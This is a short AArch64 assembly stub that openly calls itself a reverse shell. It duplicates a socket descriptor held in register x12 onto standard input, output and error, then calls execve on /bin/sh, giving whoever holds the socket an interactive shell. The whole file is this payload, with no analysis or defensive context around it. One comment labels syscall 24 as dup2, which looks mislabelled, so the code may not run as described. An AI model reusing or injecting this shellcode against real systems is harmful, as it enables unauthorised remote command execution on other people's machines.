// AArch64 Reverse Shell / Monitor Stub
// Target: Redirect STDIN(0), STDOUT(1), STDERR(2) to socket (x12)

.global _start
_start:
    mov x0, x12          // Move socket FD to x0 (oldfd)
    mov x1, #0           // STDIN
    mov x8, #24          // syscall: dup2
    svc #0               // execute

    mov x0, x12          // oldfd
    mov x1, #1           // STDOUT
    mov x8, #24          // dup2
    svc #0

    mov x0, x12          // oldfd
    mov x1, #2           // STDERR
    mov x8, #24          // dup2
    svc #0

    // Now execute the shell
    adr x0, shell_path   // Load path to /bin/sh
    mov x1, #0           // argv = NULL
    mov x2, #0           // envp = NULL
    mov x8, #221         // syscall: execve
    svc #0

shell_path:
    .ascii "/bin/sh\0"
